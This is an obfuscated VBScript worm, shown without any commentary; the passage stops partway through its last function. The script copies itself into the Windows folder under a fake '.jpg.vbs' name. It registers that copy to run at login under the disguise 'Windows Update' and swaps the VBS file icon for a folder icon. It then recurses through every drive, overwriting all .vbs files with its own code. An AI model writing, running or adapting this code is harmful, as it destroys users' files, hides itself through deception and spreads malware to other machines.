On Error resume next
Set PYARJERQCM = createobject("scripting.filesystemobject")
QOKJAQKLIL = PYARJERQCM.getspecialfolder(0)
Set FLTKSTOSPQ = CreateObject("WScript.shell")
SAFSKPABRO = QOKJAQKLIL & "\Worm_beta1.jpg.vbs"
Set NKRMPDAYBI= CreateObject("Wscript.shell")
NKRMPDAYBI.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update", "wscript.exe " &  SAFSKPABRO & " %"
FLTKSTOSPQ.RegWrite "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon\","%SystemRoot%\explorer.exe,2", "REG_EXPAND_SZ"
PYARJERQCM.copyfile wscript.scriptfullname, SAFSKPABRO
Set NPPIKIIRFM = PYARJERQCM.opentextfile(wscript.scriptfullname)
KOJSQPVJBP = NPPIKIIRFM.readall
NPPIKIIRFM.close
MIEEHGFBLW
Function MIEEHGFBLW()
Set MCENQCKCTV = PYARJERQCM.Drives
For Each QJVIUQRNCG In MCENQCKCTV
MNXGFBSDGY = QJVIUQRNCG & "\"
Call CQMAEKHABT(MNXGFBSDGY)
Next
End Function
Function CQMAEKHABT(ASAHCFEJIH)
NACRDDPFTH = ASAHCFEJIH
Set RWDNDSPESS = PYARJERQCM.GetFolder(NACRDDPFTH)
Set MDLQLBMJPH = RWDNDSPESS.Files
For Each SEXSHOORGD In MDLQLBMJPH
If PYARJERQCM.GetExtensionName(SEXSHOORGD.path) = "vbs" Then
PYARJERQCM.CopyFile wscript.scriptfullname,SEXSHOORGD.path,true
End If
Next
Set KFIUNLOLGC = RWDNDSPESS.Subfolders
For Each CBRBWKMTXH In KFIUNLOLGC
Call CQMAEKHABT(CBRBWKMTXH.path)